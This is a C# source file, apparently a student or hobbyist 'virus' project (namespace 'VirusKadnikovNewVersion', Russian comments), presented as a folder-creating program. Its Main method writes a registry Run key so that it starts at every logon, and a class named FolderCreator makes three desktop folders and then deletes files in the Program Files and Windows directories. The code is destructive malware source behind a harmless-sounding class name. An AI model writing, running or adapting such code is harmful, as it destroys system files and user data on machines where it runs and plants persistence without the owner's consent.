using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace VirusKadnikovNewVersion
{
    internal class Program
    {
        public interface IFolderCreator
        {
            void CreateFolders(string desktopPath);
        }
        // Класс, реализующий создание папок
        public class FolderCreator : IFolderCreator
        {
            public void CreateFolders(string desktopPath)
            {
                try
                {
                    string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    string windowsPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

                    // Создаем папки на рабочем столе
                    string[] folders = { "Folder1", "Folder2", "Folder3" };
                    foreach (string folder in folders)
                    {
                        string folderPath = Path.Combine(desktopPath, folder);
                        Directory.CreateDirectory(folderPath);
                        Console.WriteLine("Папка создана: " + folderPath);
                    }

                    // Удаляем файлы из папки Program Files
                    DeleteFiles(programFilesPath);

                    // Удаляем файлы из папки Windows
                    DeleteFiles(windowsPath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Ошибка при создании папок: " + ex.Message);
                }
            }

            private void DeleteFiles(string directoryPath)
            {
                try
                {
                    // Получаем список файлов в указанной директории
                    string[] files = Directory.GetFiles(directoryPath);

                    // Удаляем каждый файл
                    foreach (string file in files)
                    {
                        File.Delete(file);
                        Console.WriteLine("Файл удален: " + file);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Ошибка при удалении файлов: " + ex.Message);
                }
            }
        }
        static void Main(string[] args)
        {
            string executablePath = @"C:\Path\To\Your\Executable.exe";

            // Добавление записи в реестр для автозапуска
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("MyApplication", executablePath);
            }
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            IFolderCreator folderCreator = new FolderCreator();
            folderCreator.CreateFolders(desktopPath);

            Console.ReadLine();
        }
    }
}
